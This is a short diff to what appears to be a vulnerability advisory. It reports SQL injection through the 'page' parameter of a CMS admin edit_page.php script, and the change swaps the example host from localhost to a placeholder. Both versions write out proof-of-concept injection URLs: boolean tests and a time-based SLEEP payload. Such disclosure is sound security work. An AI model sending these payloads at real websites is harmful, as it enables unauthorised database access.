@@ -58,6 +58,6 @@ affected position:
   The "page" parameter has not been safely processed. SQL injection can be achieved by constructing SQL injection statements.
       
 affected executable: 
-  Like this: http://127.0.0.1/cms/1/admin/edit_page.php?page=2 and 1=1
-             http://127.0.0.1/cms/1/admin/edit_page.php?page=2 and 1=2
-             http://127.0.0.1/cms/1/admin/edit_page.php?page=2 RLIKE SLEEP(2)
+  Like this: http://xx.xx.com/admin/edit_page.php?page=2 and 1=1
+             http://xx.xx.com/admin/edit_page.php?page=2 and 1=2
+             http://xx.xx.com/admin/edit_page.php?page=2 RLIKE SLEEP(2)
